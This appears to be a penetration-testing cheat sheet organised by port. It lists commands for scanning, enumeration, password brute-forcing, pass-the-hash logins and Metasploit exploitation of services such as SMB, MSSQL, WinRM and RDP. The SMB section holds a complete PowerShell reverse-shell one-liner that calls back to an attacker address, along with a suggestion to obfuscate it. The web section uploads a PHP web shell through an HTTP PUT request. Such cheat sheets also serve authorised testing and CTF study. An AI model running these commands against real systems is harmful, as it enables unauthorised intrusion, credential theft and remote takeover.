CONTENT
=======
* [RECON](#RECON)
  * [File Enumeration](#file-enumeration)
  * [Port 21 - FTP](#port-21---ftp) 
  * [Port 22 - SSH](#port-22---SSH)
  * [Port 23 - Telnet](#port-23---TELNET)
  * [Port 25 - SMTP](#port-25---SMTP)
  * [Port 53 - DNS](#port-53---DNS)
  * [Port 69 - UDP - TFTP](#port-69---UDP---TFTP)
  * [Port 79 - Finger](#port-79---Finger)
  * [Port 88 - Kerberos](#port-88---kerberos)
  * [Port 110 - POP3](#port-110---pop3)
  * [Port 995,110 - POP](#port-995-110---POP)
  * [Port 111 - Rpcbind](#port-111---Rpcbind)
  * [Port 123 - TNP](#port-123---TNP)
  * [Port 135 - MSRPC](#port-135---MSRPC)
  * [Port 139,445 - SMB](#port-139-445---SMB)
  * [Port 143/993 - IMAP](#port-143-993---IMAP)
  * [Port 161/162 UDP - SNMP](#port-161-162-UDP---SNMP)
  * [Port 194/6667/6660/7000 - IRC](#port-194-6667-6660-7000---IRC)
  * [Port 264 - Check Point FireWall](#port-264---Check-Point-FireWall)
  * [LDAP - 389/636/3268/3269](#LDAP---389-636-3268-3269)
  * [HTTPS 443](#HTTPS-443)
  * [Port 502 - Modbus](#Port-502---Modbus)
  * [Port 513 - Rlogin](#Port-513---Rlogin)
  * [Port 514 - RSH](#Port-514---RSH)
  * [Port 515 - line printerdaemon LPD](#Port-515---line-printerdaemon-LPD)
  * [Port 623 UDP/TCP - IPMI](#Port-623-UDP-TCP---IPMI)
  * [Port 873 - RSYNC](#Port-873---RSYNC)
  * [Port 1028 1099 - JAVA RMI](#Port-1028-1099---JAVA-RMI)
  * [Port 1433 - MSSQL](#Port-1433---MSSQL)
  * [Port 1521 - ORACLE](#Port-1521---ORACLE)
  * [Port 3306 - MYSQL](#Port-3306---MYSQL)
  * [Port 3389 - RDP](#Port-3389---RDP)
  * [PORT 5432 5433 - POSTGRESQL](#PORT-5432-5433---POSTGRESQL)
  * [Port 6985 5986 - WINRM](#Port-6985-5986---WINRM)
  * [Port 5800 5801 5900 5901 - VNC](#Port-5800-5801-5900-590---VNC)
  * [Port 5984 - CouchDB](#Port-5984---CouchDB )
  * [Port 6000 -X11](#Port-6000---X11)
  * [Port 27017 27018 - MONGO DB](#Port-27017-27018---MONGO-DB)
  * [Port 80 - WEB SERVER](#Port-80---WEB-SERVER)

# RECON
```bash
# Enumerate subnet 
nmap -sn 10.10.10.1/24
```

```bash
# Fast simple scan
nmap -sS 10.10.10.1/24
```

```bash
# extract live IPs from scan 
nmap 10.1.1.1 --open -oG scan_result; cat scan_results | grep "/open" | cut -d " " -f 2 > live-IPs
```

```bash
# complete slow scan
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full $IP
```

```bash
# UDP scan
nmap -sU 10.10.10.1
```

```bash
# generate a good scan_report
nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o "report.html"
```
## File Enumeration

```bash
#check file type
file "file.xxx"
```
```bash
#analize string
strings "file.xxx"
```
```bash
#check a binary file in hex
ghex "file.xxx"
```

## Port 21 - FTP

```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP

# Banner Grabbing
telnet -vn $IP 21

# Anonymous login
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit

# Browser connection
ftp://anonymous:anonymous@10.10.10.xx

# Download all files
wget -m ftp://anonymous:anonymous@$IP #Donwload all

```

## Port 22 - SSH


```bash
https://www.openssh.com  # Documentation

# Enumeration
nc -vn $IP 22


# Public SSH key of server
ssh-keyscan -t rsa $IP -p <PORT>

# BruteForce:

patator ssh_login host=$IP port=22 user=root 0=your_file.txt password=FILE0 -x ignore:mesg='Authentication failed.'

hydra -l user -P /usr/share/wordlists/password/password_list.txt -e s ssh://10.10.1.1

medusa -h 10.10.1.1 -u user -P /usr/share/wordlists/password/password_list.txt -e s -M ssh

ncrack --user user -P /usr/share/wordlists/password/password_list.txt ssh://10.10.1.1

nmap --script ssh-brute --script-args userdb=usernames.txt,passdb=passwords.txt 192.168.6.134

#Msf
use auxiliary/fuzzers/ssh/ssh_version_2


# Tunneling
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>

```

## Port 23 - Telnet
```bash
# Banner Grabbing
nc -vn $IP 23

# nmap
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 $IP

```

## Port 25 - SMTP
```sh
# Finding MX servers of an organisation
dig +short mx google.com

# smtps
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587

# Enumeration
nmap -p25 --script smtp-commands $IP
# or use  nmap plugin smtp-ntlm-info.nse
# enum_users
msf > auxiliary/scanner/smtp/smtp_enum
smtp-user-enum
nmap --script smtp-enum-users.nse $IP

```
## Port 53 - DNS

```bash
# nslookup
nslookup
> SERVER <IP_DNS> #Select dns server
> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...
> <IP_MACHINE> #Reverse lookup of a machine, maybe...

# DNS lookups, Zone Transfers & Brute-Force
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l example.com ns1.example.com
dnsrecon -d excample.com -t axfr @ns2.example.com
dnsenum domain.com
# DNS - Subdomains BF
dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS>
dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan
```

## Port 69 - UDP - TFTP

```bash

nmap -p69 --script=tftp-enum.nse $IP 
#or
nmap -n -Pn -sU -p69 -sV --script tftp-enum $IP
# Download Upload
msf5> auxiliary/admin/tftp/tftp_transfer_util

```
## Port 79 - Finger
```bash
# Enumeration Banner Grabbing
nc -vn <IP> 79
echo "root" | nc -vn $IP 79

# User enumeration
finger @$IP       #List users
finger admin@$IP  #Get user info
finger user@$IP   #Get user info

# msf
msf> use auxiliary/scanner/finger/finger_users[README.md](https://github.com/Indunil-jayaranga/Lo0t_boX/files/9222613/README.md)

```
## Port 88 - Kerberos 
```bash
#GET USERS :

nmap -p 99 --script=krb5-enum-users --script-arg"krb5-enum-users.realm='DOMAIN'"  $IP

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -domain DOMAIN -outputfile kb_extracted_passwords.txt

```

## Port 110 - POP3
```bash
telnet $IP
USER user@ip
PASS password

```

## Port 995 110 -POP
```bash
# Banner Grabbing
nc -nv $ip 110
openssl s_client -connect $ip:995 -crlf -quiet

# Automated
nmap --scirpt "pop3-capabilities / pop3-ntlm-info" -sV -port <PORT> $ip

```

## Port 111 - Rpcbind
```bash
# Enumeration
rpcinfo <domain> 
nmap -sSUC -p111 $ip

rpcinfo -p $ip
rpcclient -U "" $ip
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

## Port 123 - TNP
```bash
#Enumearation

nmap -sU -sV --script "ntp*" -p 123 $ip

ntpq -c readlist $ip
ntpq -c readvar $ip
ntpq -c monlist $ip
ntpq -c peers $ip
ntpq -c listpeers $ip
ntpq -c associations $ip 
ntpq -c sysinfo $ip
```

## Port 135 - MSRPC
```bash
# Enumeration
nmap $ip --script=msrpc-enum
nmap -n -sV -p 135 --script=msrpc-enum $ip

#msf
msf > use exploit/windows/dcerpc/ms03_026_dcom
msf > use auxiliary/scanner/dcerpc/endpoint_mapper
msf > use auxiliary/scanner/dcerpc/hidden
msf > use auxiliary/scanner/dcerpc/management
msf > use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

# Identifying Exposed RPC Services

rpcdump -p port $IP
rpcdump.py $IP -p 135
```

## Port 139 445 - SMB
```bash
# Enum hostname
enum4linux -n $ip
nmblookup -A $ip
nmap --script=smb-enum* --script-args=unsafe=1 $ip

#Get version
smbver.sh $ip
msf > use scanner/smb/smb_version
smbclient -L \\\\$IP

#Get Shares 
smbmap -H $ip -R <sharename>
echo exit | smbclient -L \\\\
smbclient \\\\$ip\<share>
smbclient -L //$ip -N
nmap --script smb-enumshares -p139,445 -Pn $ip
smbclient -L \\\\$ip\\

# check null sessions
smbmap -H $ip
rpcclient -U "" -N $ip
smbclient //$ip/IPC$ -N

#Exploit null sessions
enum -s $ip
enum -U $ip
enum -P $ip
/usr/share/doc/python3-impacket/examles/samrdump.py $ip

# connect to username shares
smbclient //$ip/share -U username

# connect to share anonumously 
smbclient \\\\$IP\\<share>
smbclient //$IP/<share>
smbclient //$IP/<share\ name>
smbclient //$IP/<""share name"">
rpcclient -U " " $IP
rpcclient -U " " -N $IP

#check vulns
nmap --script smb-vuln* -p139,445 -Pn $ip

#check seceurity concerns
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc

msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc

#exploits
msf > use exploit/multi/samba/usermap_script

#Bruteforce login
medusa -h $IP -u username -P passwordlist.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=passwordlist.txt $ip  
nmap -script smb-brute $IP

#nmap smb enum & vuln
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 $ip

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 $ip

#Mount smb volume
mount -t cifs -o username=user,password=password //$ip/share /mnt/share

# Run cmd over smb from linux
winexe -U username //$ip "cmd.exe" --system

# smbmap
    #Enum
smbmap.py -H $ip -u administrator -p asdf1234
    #RCE
smbmap.py -u username -p 'password' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H $ip
    # Drive Listing
smbmap.py -H $ip -u username -p 'password' -L
    # Reverse Shell
smbmap.py -u username -p 'password' -d DOMAINNAME -H $ip -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'

#you can use obfuscated one!
```
## Port 143 993 - IMAP
```bash

#Banner grabbing
nc -nv $ip 143
openssl s_client -connect $ip:<port> -quiet

#NTLM Auth - Information disclosure 
nmap -sS --script=imap-ntlm-info.nse -sV $ip
```

## Port 161 162 UDP - SNMP
```bash

nmap -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip

snmp-check $ip -c public|private|community

snmpwalk -v 2c -c public $ip
```

## Port 194 6667 6660 7000 - IRC
```bash
#Enumeration
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 <domain>
```

## Port 264 - Check Point FireWall
```baash
msf > use auxiliary/gather/checkpoint_hostname
```
##  LDAP - 389 636 3268 3269
```bash
# Basic Enumeration
nmap -n -sV --script "ldap* and not brute" $ip

# Clear text credentials
* If LDAP is used without SSL you can sniff credentials in plain text in the network.

ldapsearch -h $ip -p 389 -x -b "dc=mywebsite,dc=com"

ldapsearch -x -h $ip -D 'DOMAIN\user' -w 'hash-password'

ldapdomaindump $ip -u 'DOMAIN\user' -p 'hash-password'

ldapsearch -x -h $ip -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"

#brut

ldapsearch -x -h $IP -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
ldapsearch -x -h $IP -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"

patator ldap_login host=$IP 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'
```
## HTTPS 443
```bash 
sslscan $IP:443
nmap -sV --script=ssl-heartbleed $IP
```
read >>  https://www.kaspersky.com/resource-center/definitions/what-is-a-ssl-certificate

## Port 502 - Modbus
```bash
# Enumerate
nmap --script modbus-discover -p 502 $IP
msf> use auxiliary/scanner/scada/modbusdetect
msf> use auxiliary/scanner/scada/modbus_findunitid
```

## Port 513 - Rlogin
```bash
#login
apt install rsh-client
rlogin -l <USER> $ip
```

## Port 514 - RSH
```bash
#login
rsh $ip <Command>
rsh $ip -l domain\user <Command>
rsh domain/user@$ip <Command>
rsh domain\\user@$ip <Command>
```

## Port 515 - line printerdaemon LPD
```bash
# The lpdprint tool included in PRET is a minimalist way to print data directly to an LPD capable printer as shown below:
lpdprint.py hostname filename
```
## Port 623 UDP TCP - IPMI
```bash
#Enumeration
nmap -n -p 623 10.0.0./24
nmap -n -sU -p 623 10.0.0./24
msf > use auxilary/scanner/ipmi/ipmi_version

#version
msf > use auxilary/scanner/ipmi/ipmi_version
```

## Port 873 - RSYNC
```bash
#Enumeration
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version 
@RSYNCD: 31.0        <--- Then you send the same info
# list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID    <--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection

nmap -sV --script "rsync-list-modules" -p 873 $IP
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[$IPv6]:8730

# manual
rsync -av --list-only rsync://$IP/shared_name
```

## Port 1028 1099 - JAVA RMI
```bash
#Enumeration

# Basically this service could allow you to execute code.
msf > use auxiliary/scanner/misc/java_rmi_server
msf > use auxiliary/gather/java_rmi_registry
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p 1028 $IP

# Reverse Shell
msf > use exploit/multi/browser/java_rmi_connection_impl
```
## Port 1433 - MSSQL
```bash
# infomation 

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping

nmap -p 1433 -sU --script=ms-sql-info.nse $IP
sqsh -S $IP -U <Username> -P <Password> -D <Database>

#msfconsole
#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
## Port 1521 - ORACLE
```bash
oscanner -s $IP -P 1521
tnscmd10g version -h $IP
tnscmd10g status -h $IP
nmap -p 1521 -A $IP
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute

#msfconsole
msf > use auxiliary/admin/oracle
msf > use auxiliary/scanner/oracle
```
## Port 3306 - MYSQL
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP
msf> use auxiliary/scanner/mysql/mysql_version
msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump 
msf> use auxiliary/admin/mysql/mysql_enum 
msf> use auxiliary/scanner/mysql/mysql_schemadump 

#Exploit
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows,

# Connect Remote
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
## Port 3389 - RDP
```bash
# enumeration
nmap -p 3389 --script=rdp-vuln-ms12-020.nse $IP
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $IP

# Connect with known credetials
rdesktop -u <username> $IP
rdesktop -d <domain> -u <username> -p <password> $IP
xfreerdp /u:[domain\]<username> /p:<password> /v:$IPP
xfreerdp /u:[domain\]<username> /pth:<hash> /v:$IP

# Check known credentials
rdp_check <domain>\<name>:<password>@$IP
```
## PORT 5432 5433 - POSTGRESQL
```bash
# Connect
psql -U <myuser> # Open psql console with user

# Remote connection
psql -h $IP -U <username> -d <database>
psql -h $IP -p <port> -U <username> -W <password> <database>

psql -h localhost -d <database_name> -U <User> 
\list # List databases
\c <database> # use the database
\d # List tables

#To read a file:
CREATE TABLE demo(t text);
COPY demo from '[FILENAME]';
SELECT * FROM demo;

# Enumeration
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
## Port 6985 5986 - WINRM

5985/tcp (http) 5986/tcp (https)
```bash
gem install evil-winrm
evil-winrm -i $ip -u Administrator -p 'password'

#pass the hash with evil-winrm
evil-winrm -i $ip -u Administrator -H 'hash-pass'

#msfconsole
msf > use auxiliary/scanner/winrm/winrm_login
#Bruteforce
msf > use auxiliary/scanner/winrm/winrm_login
#Run Commands
msf > use auxiliary/scanner/winrm/winrm_cmd
#Get a Shells
msf > use exploit/windows/winrm/winrm_script_exec
```
## Port 5800 5801 5900 5901 - VNC
```bash
#Enumeration
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> $IP
msf> use auxiliary/scanner/vnc/vnc_none_auth

#connect
vncviewer [-passwd passwd.txt] $IP::5901
```

## Port 5984 - CouchDB 
```bash
# Enumeration
nmap -sV --script couchdb-databases,couchdb-stats -p 5984 $IP
msf> use auxiliary/scanner/couchdb/couchdb_enum

curl http://IP:5984/
```
## Port 6000 - X11
```bash 
# Enumeration
nmap -sV --script x11-access -p 6000 $IP
msf> use auxiliary/scanner/x11/open_x11

# Remote Desktop View Way from:
https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref

# Get Shell
msf> use exploit/unix/x11/x11_keyboard_exec
```

## Port 27017 27018 - MONGO DB
```bash
# MongoDB commnads:
show dbs
use <db>
show collections
db.<collection>.find()  #Dump the collection
db.<collection>.count() #Number of records of the collection
db.current.find({"username":"admin"})  #Find in current db the username admin

# Automatic
nmap -sV --script "mongo* and default" -p 27017 $IP

# Login
mongo $IP
mongo $IP:<PORT>
mongo $IP:<PORT>/<DB>
mongo <database> -u <username> -p '<password>'

nmap -n -sV --script mongodb-brute -p 27017 $IP
```
## Port 80 - WEB SERVER
```bash
# Server Version (Vulnerable?)
whatweb -a 1 <URL> 
webtech -u <URL>

# Nikto
nikto -h http://$ip

# CMS Explorer
cms-explorer -url http://$IP -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://$IP
wpscan --url http://$IP --enumerate vp
wpscan --url http://$IP --enumerate vt
wpscan --url http://$IP --enumerate u
wpscan -e --url https://url.com

# Enum User:

for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}';done

# Joomscan
joomscan -u  http://$IP
joomscan -u  http://$IP --enumerate-components

# Get header
curl -i $IP

# Get options
curl -i -X OPTIONS $IP

# Get everything
curl -i -L $IP
curl -i -H "User-Agent:Mozilla/4.0" http://$IP:8080

# Check for title and all links
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl $IP -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://$IP/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php

# Simple curl POST request with login data
curl -X POST http://$IP/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'

curl -s  http://$IP/fileRead.php -d 'file=fileRead.php' | jq -r ."file"
```

